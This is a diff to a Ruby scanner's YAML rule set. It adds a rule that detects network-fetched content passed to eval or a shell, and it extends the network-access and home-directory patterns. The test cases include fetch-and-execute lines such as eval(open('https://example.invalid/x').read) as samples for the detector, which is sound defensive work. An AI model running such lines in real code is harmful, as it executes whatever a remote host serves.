@@ -446,6 +446,35 @@ rules:
         - "# eval is not used here"
         - "obj = Marshal.load(data)"
 
+  - id: CAP.RB.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is evaluated directly
+    message: >
+      The result of a network read is handed straight to eval or a shell: what runs is whatever the
+      remote host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [ruby]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:eval|instance_eval|class_eval|module_eval|system|exec|spawn)\s*[( ]\s*(?:Kernel\s*\.\s*|URI\s*\.\s*)?open\s*\(\s*[^)\n]{1,200}\)\s*\.\s*read\b'
+        - '\b(?:eval|instance_eval|class_eval|module_eval|system|exec|spawn)\s*[( ]\s*Net::HTTP\s*\.\s*get\s*\('
+        - '\b(?:eval|instance_eval|class_eval|module_eval)\s*[( ]\s*(?:HTTParty|RestClient|Faraday)\s*\.\s*get\s*\([^)\n]{1,200}\)\s*(?:\.\s*body\b)?'
+    tests:
+      positive:
+        - "eval(open('https://example.invalid/x').read)"
+        - "eval(URI.open(url).read)"
+        - "eval(Net::HTTP.get(URI(url)))"
+        - "eval HTTParty.get(url).body"
+      negative:
+        - "page = URI.open(url).read"
+        - "File.open(path).read"
+        - "eval(File.read(path))"
+
   - id: CAP.RB.DESERIALIZE.001
     version: 1.0.0
     category: policy
@@ -537,9 +566,12 @@ rules:
         - '\bopen-uri\b|\bURI\s*\.\s*(?:open|parse)\s*\('
         - '\bHTTParty\b|\bFaraday\b|\bRestClient\b'
         - '\bTCPSocket\s*\.\s*new\s*\('
+        - '\bResolv(?:::DNS)?\s*(?:\.\s*(?:new|open|getaddress|getaddresses|getresources?)\b)'
+        - '(?:\bKernel\s*\.\s*|(?<![.\w]))open\s*\(\s*["''](?:https?|ftp)://'
     tests:
       positive:
         - "Net::HTTP.post(uri, body)"
+        - "data = open('https://example.invalid/x').read"
       negative:
         - "# HTTP calls go through the client module"
 
@@ -900,6 +932,7 @@ rules:
         - '\bSocket\s*\.\s*gethostname\b'
         - '\bEtc\s*\.\s*(?:getlogin|getpwuid)\b'
         - '\bDir\s*\.\s*home\b'
+        - '\bFile\s*\.\s*expand_path\s*\(\s*["'']~["'']\s*\)'
     tests:
       positive:
         - "host = Socket.gethostname"
